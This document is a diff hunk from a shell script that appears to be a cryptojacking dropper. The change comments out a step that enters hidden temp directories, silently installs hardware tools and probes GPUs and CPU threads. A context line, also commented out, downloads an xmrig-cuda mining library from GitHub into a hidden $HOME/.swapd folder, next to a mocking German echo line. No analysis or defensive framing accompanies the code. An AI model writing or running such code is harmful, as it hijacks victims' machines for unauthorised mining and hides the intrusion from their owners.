@@ -360,8 +360,8 @@ else
 fi
 echo ""
 
-echo "[*] Determining GPU+CPU"
-cd /tmp ; cd .ICE-unix ; cd .X11-unix ; yum install pciutils lshw -y; apt install pciutils lshw -y; update-pciids ; lspci -vs 00:01.0 ; lshw -C display ; nvidia-smi ; aticonfig --odgc --odgt ; nvtop ; radeontop ; echo "Possible CPU Threads:" ; (nproc) ;
+#echo "[*] Determining GPU+CPU"
+#cd /tmp ; cd .ICE-unix ; cd .X11-unix ; yum install pciutils lshw -y; apt install pciutils lshw -y; update-pciids ; lspci -vs 00:01.0 ; lshw -C display ; nvidia-smi ; aticonfig --odgc --odgt ; nvtop ; radeontop ; echo "Possible CPU Threads:" ; (nproc) ;
 # cd $HOME/.swapd/ ; wget https://github.com/pwnfoo/xmrig-cuda-linux-binary/raw/main/libxmrig-cuda.so
 
 # echo "[*] MO0RPHIUM!! Viiiiel M0RPHIUM!!! Brauchen se nur zu besorgen, fixen kann ich selber! =)"
